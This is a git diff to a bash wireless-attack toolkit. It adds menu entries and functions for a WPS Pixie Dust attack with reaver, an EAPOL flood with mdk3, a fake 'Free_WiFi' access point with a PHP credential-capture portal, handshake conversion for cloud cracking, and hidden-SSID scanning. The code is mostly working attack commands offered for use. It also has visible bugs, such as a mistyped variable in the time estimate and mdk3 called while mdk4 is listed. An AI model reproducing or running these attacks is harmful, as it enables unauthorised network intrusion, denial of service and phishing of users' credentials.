@@ -73,7 +73,7 @@ fedora=$(echo $?)
 #On the basis of the distribution, download the dependencies 
 programs() {
 	
-	dependencias=(aircrack-ng xterm hashcat nmap hcxtools hcxdumptool php dnsmasq hostapd mdk4 gunzip tshark cap2hccapx.bin dsniff arp-scan)
+	dependencias=(aircrack-ng xterm hashcat nmap hcxtools hcxdumptool php dnsmasq hostapd mdk4 gunzip tshark cap2hccapx.bin dsniff arp-scan wash)
 	
 	if [ "$debian" -eq 0 ]; then 
 		clear; tput civis
@@ -829,6 +829,66 @@ gpuhand() {
 	hashcat -a 0 -m 2500 -D 2 -d $numgpu1 Handshake.hccapx $pathgpu1
 	echo -ne "\n$greenColour[!]$grayColour Enter to continue" && read
 }
+
+wps_pixie_dust() {
+	echo -e "${greenColour}[*]${grayColour} Starting WPS Pixie Dust Attack${endColour}"; sleep 2
+	echo -e "${yellowColour}[!]${grayColour} Scanning for WPS-enabled APs...${endColour}"
+	xterm -hold -e "wash -i $tar -C" &
+	wash_id=$!
+	echo -ne "$(echo -e "${yellowColour}[?]${grayColour} Enter target BSSID: ")" && read bssidwps
+	echo -ne "$(echo -e "${yellowColour}[?]${grayColour} Enter channel: ${endColour}")" && read channelwps
+	echo -e "${blueColour}[*]${grayColour} Launching Pixie Dust Attack...${endColour}"; sleep 1
+	reaver -i wlan0mon -b $bssidwps -c $channelwps -K 1 -vv
+}
+
+eapol_flood() {
+	echo -e "${greenColour}[*]${grayColour} Starting ${greenColour}EAPOL Flood Attack${endColour}"; sleep 2
+	echo -ne "$(echo -e "${yellowColour}[?]${grayColour} Enter target BSSID: ${endColour}")" && read bssidea
+	echo -e "${yellowColour}[!]${grayColour} Flooding AP with EAPOL packets...${endColour}"
+	mdk3 $tar a -a $bssidea
+}
+
+fake_login_page() {
+	echo -e "${blueColour}[*]${grayColour} Starting ${greenColour}Fake Login Page (Phishing)...${endColour}"; sleep 2
+	echo -e "${yellowColour}[!]${grayColour} Setting up fake AP...${endColour}"
+	
+	# Set up fake AP
+	hostapd_conf="fakeap.conf"
+	echo "interface=$tar" > $hostapd_conf
+	echo "ssid=Free_WiFi" >> $hostapd_conf #Cambiar a input del usuario 
+	echo "channel=6" >> $hostapd_conf
+
+	xterm -hold -e "hostapd $hostapd_conf" &
+	sleep 2
+	echo -e "${yellowColour}[!]${grayColour} Capturing credentials on portal page...${endColour}"
+	# Simple server setup
+	xterm -hold -e "php -S 0.0.0.0:8080 -t portal/" &
+}
+
+attack_time_estimation() {
+	echo -e "${blueColour}[*]${grayColour} Starting ${greenColour}Attack Time Estimation${endColour}"
+	read -p "$(echo -e "${yellowColour}[?]${grayColour} Enter dictionary size: ${endColour}")" dict_size
+	read -p "$(echo -e "${yellowColour}[?]${grayColour} Enter cracking speed (keys/sec): ${endColour}")" speeda
+
+	time_estimate=$((dict_size / speeds))
+	echo -e "${greenColour}[+]${grayColour} Estimated time: ${time_estimate} seconds${endColour}"
+}
+
+cloud_cracking() {
+	echo -e "${blueColour}[*]${grayColour} Starting ${greenColour}Cloud Cracking${endColour}"
+	read -p "$(echo -e "${yellowColour}[?]${grayColour} Enter .cap file path: ${endColour}")" cap_filecl
+	echo -e "${yellowColour}[!]${grayColour} Converting file to .hccapx format...${endColour}"
+	aircrack-ng -J output $cap_filecl
+
+	echo -e "${yellowColour}[!]${grayColour} Upload the 'output.hccapx' file to your cloud service (AWS/Google).${endColour}"
+}
+
+hidden_network_scan() {
+	echo -e "${blueColour}[*]${grayColour} Starting ${greenColour}Hidden Network Scan${endColour}"
+	echo -e "${yellowColour}[!]${grayColour} Scanning for hidden SSIDs...${endColour}"
+	xterm -hold -e "airodump-ng $tar --essid "" --channel 1-13" &
+}
+
 #banner main
 banner() {
 	echo "  _       __  _   ____  _      ____                               __      __ "
@@ -890,6 +950,24 @@ bannermainattack() {
 		;;
 		13)
 		gpuhash
+		;;
+		22)
+		wps_pixie_dust
+		;;
+		23)
+		eapol_flood
+		;;
+		24)
+		fake_login_page
+		;;
+		25)
+		attack_time_estimation
+		;;
+		26)
+		cloud_cracking
+		;;
+		27)
+		hidden_network_scan
 		;;
 		99)
 		exitresart
